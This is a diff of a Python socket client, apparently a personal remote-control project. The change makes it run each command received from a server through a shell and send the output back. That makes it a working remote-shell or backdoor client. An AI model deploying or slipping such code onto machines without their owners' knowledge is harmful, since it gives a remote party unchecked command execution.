@@ -2,33 +2,31 @@ import socket
 import subprocess
 import select
 import threading
+import sys
 # https://docs.python.org/3/library/socketserver.html#socketserver-tcpserver-example
 
 
 def is_socket_closed(sock: socket.socket) -> bool:
-    readable, _, _ = select.select([sock], [], [], 0)
-    return readable
+    try:
+        # Check if the socket is still open by looking at the file descriptor
+        if sock.fileno() == -1:
+            return True
+        readable, _, _ = select.select([sock], [], [], 0)
+        return readable
+    except (ValueError, OSError):
+            return True
 
 
-def send_data(sock: socket.socket):
+def send_data(sock: socket.socket, msg):
     if is_socket_closed(sock):
         print('Connection aborted (not in the whitelist)')
         return
-    
     try:            
-        msg = 'First connection ping'    
         # Send data to the server
         sock.sendall(msg.encode('utf-8')) 
 
-        while not is_socket_closed(sock): # the client now only listen 
-            # Get data back from server
-            get_data(sock)
-
     except ConnectionResetError:
         print('The server closed the connection')
-    finally:
-        print('Connection closed')
-        sock.close()
 
 
 def get_data(sock: socket.socket):
@@ -37,22 +35,37 @@ def get_data(sock: socket.socket):
         print(f'Server response : {res}')
         if res != 'Alive ping back received':
             command = res.split(' ')
-            exec_command(command)
+            res = exec_command(command)
+            send_data(sock, res) # Returning command output
     except socket.timeout:
         print("Timeout, no response from server")
     except ConnectionAbortedError :
-        print('Connection aborted from server')
+        pass # local closing
 
 
-# example : command = ['powershell', 'start', 'brave', 'www.google.ca']
+# example : command = ['powershell', 'start', 'brave', 'www.google.com']
 def exec_command(command):
-    # Shell=True : features such as shell pipes, filename wildcards, environment variable expansion
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-    if result.stdout:
-        print(result.stdout)
-    if result.stderr:
-        print(result.stderr)
+    output = result.stdout or result.stderr
+    if output:
+        print(output)
+    return output
+
+
+def listen_for_commands(sock : socket.socket):
+    try:            
+        # socket_closed = False
+        while True :
+            print('Listening for inc data')
+            get_data(sock)
+            if is_socket_closed(sock):
+                break
+
+    except ConnectionResetError:
+        print('The server closed the connection')
+    finally:
+        print('Connection closed')
 
 
 if __name__ == '__main__':
@@ -62,10 +75,13 @@ if __name__ == '__main__':
         try: 
             sock.connect((HOST, PORT))
             print(f'Connected @ : {sock.getpeername()}')
+            send_data(sock, 'First connection ping')
 
-            sock_thread = threading.Thread(target=send_data, args=(sock,))
+            sock_thread = threading.Thread(target=listen_for_commands, args=(sock,))
             sock_thread.daemon = True  # Set the thread as a daemon so it doesn't block exit
             sock_thread.start()
+
+            print(threading.active_count())
 
             try:
                 while sock_thread.is_alive():
@@ -73,8 +89,8 @@ if __name__ == '__main__':
             except KeyboardInterrupt:
                 print('Client terminated by user (Ctrl+C)')
                 sock.close()
-            
+                sock_thread.join()
+                # print(f"Threads : {threading.active_count()}")
+
         except ConnectionRefusedError:
             print('Connection refused by the host (server might be down or unreachable)')
-        
-        
